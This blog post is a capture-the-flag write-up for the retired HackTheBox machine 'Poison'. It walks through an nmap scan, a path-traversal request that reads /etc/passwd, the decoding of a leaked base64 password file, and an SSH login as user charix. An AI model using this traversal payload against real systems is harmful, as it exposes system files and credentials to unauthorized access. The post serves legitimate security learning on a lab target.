+++
author = "Dan Salmon"
date = 2018-10-18T04:33:52Z
description = "My guide to getting user access on Poison"
draft = false
tags = ["hackthebox", "ctf"]
slug = "hackthebox-poison"
title = "HackTheBox 'Poison' - Own User Guide"
type = "post"
+++

**Note:** *If you are currently trying to get access to this box, I highly recommend you try it yourself first and only use this guide if you really are stuck.*
<br />
<br />


### Intro

Now that the Poison box is retired on hackthebox, we can talk publicly about how to gain access to this machine. While this machine was active, I only took the time to gain user access, not all the way to root. There are multiple ways to get access on Poison, but I'm just showing the way I took which is one of the shortest routes to the user. 


### Machine Overview

All we know about this box initially is that it's running FreeBSD and that most users who have completed it rate it as relatively easy to exploit. 

![poison-overview](../images/poison-overview.png)


### Steps

As with all pentests, we must start with recon. Let's start by port scanning the box.

```shell
nmap -sC -sV -oA hackthebox-poison 10.10.10.84
```

and the results show:

![poison-scan](../images/poison-scan.png)

So we can see this box only has SSH and HTTP running. Let's see what's running on port 80.

![poison-home](../images/poison-home.png)


Here there's a list of file names and a textbox. If we enter any of the filenames into the text box, the page seems to read the contents of the file and output it to the screen. We're expected to input a file from the list of file names, but let's see what happens if we try to leave the current directory.

In the browser, try to navigate to

```json
http://10.10.10.84/browse.php?file=../../../../../../../../../etc/passwd
```

and we should get the output

```
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

Nice! The page is vulnerable to a [Path Traversal attack](https://www.owasp.org/index.php/Path_Traversal). In the output we can see that there are 2 users that have shell access on the box: `charix` and `root`.

This is good information, but not enough to get access into the box. Let's circle back to the files listed on the home page

```
ini.php
info.php
listfiles.php
phpinfo.php
```

Entering `listfiles.php` into the box on the home page lists the files we already know about, but also an unknown file with an interesting name - `pwdbackup.txt`. 

Well let's check that one out!

```json
http://10.10.10.84/browse.php?file=pwdbackup.txt
```

```markdown
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

We can tell it's probably Base64 encoded based on the fact that it ends with an equal sign. Since the hint tells us it's encoded 13x, just run it through a Base64 decoder 13x. After all that we get:

```markdown
Charix!2#4%6&8(0
```

Sure looks like a password to me! Verify this by SSH'ing into the box with this password:

```
ssh charix@10.10.10.84
```

and of course grab the flag to claim

```
$ cat ~/user.txt
eaacdfb2d141b72a589233063604209c
```

Root escalation will be left as an excercise to the reader (because I didn't have time to do it before the box was retired).







